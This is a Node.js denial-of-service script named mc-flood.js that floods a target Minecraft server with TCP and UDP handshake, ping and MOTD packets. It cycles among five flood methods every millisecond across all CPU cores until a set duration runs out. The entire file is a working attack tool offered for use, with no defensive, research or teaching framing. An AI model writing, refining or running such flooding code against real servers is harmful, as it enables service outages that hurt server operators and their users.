const net = require('net');
const dgram = require('dgram');
const cluster = require('cluster');
const crypto = require('crypto');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 4) {
    console.log('Usage: node mc-flood.js <target> <port> <duration>');
    process.exit(0);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

// Minecraft packet constants
const PACKET_HANDSHAKE = 0x00;
const PACKET_PING = 0x01;
const PROTOCOL_VERSION = 47; // Minecraft 1.8+ protocol

// Generate random username for MOTD requests
const generateUsername = () => {
    const prefix = ['Pro', 'Cool', 'Epic', 'Mega', 'Ultra', 'Super', 'Hyper', 'MVP'];
    const suffix = ['Player', 'Gamer', 'PvP', 'Gaming', 'Pro', 'YT', 'Live'];
    return prefix[Math.floor(Math.random() * prefix.length)] + 
           '_' + 
           suffix[Math.floor(Math.random() * suffix.length)] + 
           Math.floor(Math.random() * 9999);
};

// Create Minecraft ping packet
const createPingPacket = () => {
    const username = generateUsername();
    const pingData = Buffer.from([
        PACKET_HANDSHAKE,  // Packet ID
        PROTOCOL_VERSION,  // Protocol Version
        username.length,   // Username length
        ...Buffer.from(username), // Username
        0x01,             // Next state (1 for status)
    ]);

    return Buffer.concat([
        Buffer.from([pingData.length]), // Packet length
        pingData // Packet data
    ]);
};

// Create MOTD request packet
const createMotdPacket = () => {
    const hostname = target;
    const data = Buffer.from([
        0x00, // Packet ID
        0x00, // Protocol version
        hostname.length, // Hostname length
        ...Buffer.from(hostname), // Hostname
        0xff, 0xff, // Port (65535)
        0x01 // Next state (1 for status)
    ]);

    return Buffer.concat([
        Buffer.from([data.length]), // Packet length
        data // Packet data
    ]);
};

const methods = [
    // Method 1: TCP Ping Flood
    async () => {
        const socket = new net.Socket();
        
        try {
            socket.connect(port, target, () => {
                // Send multiple ping packets
                for(let i = 0; i < 10; i++) {
                    socket.write(createPingPacket());
                }
            });

            socket.on('error', () => {
                socket.destroy();
            });
        } catch (err) {
            socket.destroy();
        }
    },

    // Method 2: TCP MOTD Flood
    async () => {
        const socket = new net.Socket();
        
        try {
            socket.connect(port, target, () => {
                // Send multiple MOTD requests
                for(let i = 0; i < 10; i++) {
                    socket.write(createMotdPacket());
                }
            });

            socket.on('error', () => {
                socket.destroy();
            });
        } catch (err) {
            socket.destroy();
        }
    },

    // Method 3: UDP Ping Flood
    async () => {
        const client = dgram.createSocket('udp4');
        
        try {
            // Send multiple UDP ping packets
            for(let i = 0; i < 10; i++) {
                const packet = createPingPacket();
                client.send(packet, port, target, (error) => {
                    if (error) client.close();
                });
            }
        } catch (err) {
            client.close();
        }
    },

    // Method 4: UDP MOTD Flood with Random Data
    async () => {
        const client = dgram.createSocket('udp4');
        
        try {
            // Send multiple UDP MOTD packets with random data
            for(let i = 0; i < 10; i++) {
                const randomData = Buffer.concat([
                    createMotdPacket(),
                    crypto.randomBytes(Math.floor(Math.random() * 1024))
                ]);
                client.send(randomData, port, target, (error) => {
                    if (error) client.close();
                });
            }
        } catch (err) {
            client.close();
        }
    },

    // Method 5: Mixed Protocol Attack
    async () => {
        const tcpSocket = new net.Socket();
        const udpSocket = dgram.createSocket('udp4');
        
        try {
            // TCP attack
            tcpSocket.connect(port, target, () => {
                tcpSocket.write(createPingPacket());
                tcpSocket.write(createMotdPacket());
            });

            // UDP attack
            udpSocket.send(createPingPacket(), port, target);
            udpSocket.send(createMotdPacket(), port, target);

            tcpSocket.on('error', () => tcpSocket.destroy());
            udpSocket.on('error', () => udpSocket.close());
        } catch (err) {
            tcpSocket.destroy();
            udpSocket.close();
        }
    }
];

const flood = () => {
    setInterval(() => {
        // Execute random method
        const method = methods[Math.floor(Math.random() * methods.length)];
        method();
    }, 1);
};

if (cluster.isMaster) {
    const numCPUs = require('os').cpus().length;
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(0);
    }, duration * 1000);
} else {
    flood();
} 